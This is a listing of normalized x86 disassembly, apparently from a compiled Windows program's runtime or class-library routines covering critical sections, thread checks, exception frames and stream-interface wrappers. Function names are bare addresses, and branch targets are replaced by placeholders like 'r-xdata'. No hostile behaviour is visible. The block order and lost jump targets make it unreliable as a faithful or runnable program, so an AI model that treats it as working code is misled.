call sub_41e2e8
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx ebx
mov eax esi
call sub_41e2e8
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041a8
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_420368
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420501
lea eax [ ebp - 0xc ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_42051c
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_4205b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
call sub_42058c
mov eax ebx
call sub_420598
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_420742
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420723
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42072a
mov eax [ ebp - 0xc ]
call sub_403190
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418470
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_418360
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4206ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4206be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_420754
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_42090c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4207a0
push ebx
push esi
push ecx
call sub_40355c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_4209f4
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_42099c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_418a58
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_420964
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403544
lea eax [ ebx + 0x14 ]
call sub_40d1d0
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_418470
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_420824
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4184cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_418314
mov edx ebx
mov eax esi
call sub_420824
sub_4208b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418314
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x10 ] eax
sub_4208e4
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41860c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403190
xor eax eax
mov [ ebx + 0x10 ] eax
sub_42090c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40338c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4208b8
mov dl 0x1
mov eax ebx
call sub_420e2c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_420ddc
sub_420964
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_420e2c
mov edx ebx
mov eax esi
call sub_4208e4
pop edi
pop esi
pop ebx
retn
sub_42099c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_418558
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_420964
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_4208e4
sub_4209f4
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418470
call sub_4209f4
inc edi
dec esi
jne r-xdata
sub_420a30
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41860c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403190
xor eax eax
mov [ ebx + 0x14 ] eax
sub_420a54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420a30
mov edx ebx
mov eax esi
call sub_420a30
pop esi
pop ebx
retn
sub_420a70
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_420a54
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418470
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_420acc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420878
push ebx
push sub_4208a0
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_42088c
push ebx
push sub_4208ac
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420bc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407e20
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420c5c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
sub_420c5c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418470
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407e20
test al al
jne r-xdata
sub_420cac
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40432c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407fa4
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
xor edx edx
mov eax ebx
call sub_420e2c
mov edx esi
mov eax ebx
call sub_420d38
mov dl 0x1
mov eax ebx
call sub_420e2c
sub_420d4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418470
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4183fc
sub_420d88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4184cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418360
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4184ec
sub_420ddc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420d78
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420d4c
mov cl 0x1
mov edx ebx
call sub_420ddc
inc edi
dec ebp
jne r-xdata
sub_420e2c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4041bc
mov edx esp
mov eax esi
call sub_4034a4
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_420e74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420e9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420ee4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403244
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420f24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_420f44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_420f68
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_420fb0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov edx esi
call sub_4211e0
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_421018
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4211e0
mov edx ebx
mov eax esi
call sub_4211d4
sub_42105c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420754
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4210a0
push ebx
push esi
push edi
call sub_40355c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4207a0
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_420a54
jmp r-xdata
mov eax esi
call sub_418558
mov edx eax
mov eax edi
call sub_4211e0
lea eax [ edi + 0x50 ]
call sub_40d1d0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
sub_421100
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_42112c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421148
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421164
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418470
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4211e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418360
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418470
cmp ebp eax
jne r-xdata
sub_421220
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_420a54
mov edx ebx
call sub_420824
sub_42124c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403160
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_421294
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403190
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4212cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42131b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421334
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421383
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42139c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421406
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421420
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421469
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41a924
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421484
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405800
xor eax eax
push ebp
push sub_421671
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_42164a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026dc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421639
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421678
lea eax [ ebp + 0xc ]
call sub_40578c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_4216b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_421717
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421748
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418834
mov edi eax
xor eax eax
push ebp
push sub_42179d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4217a4
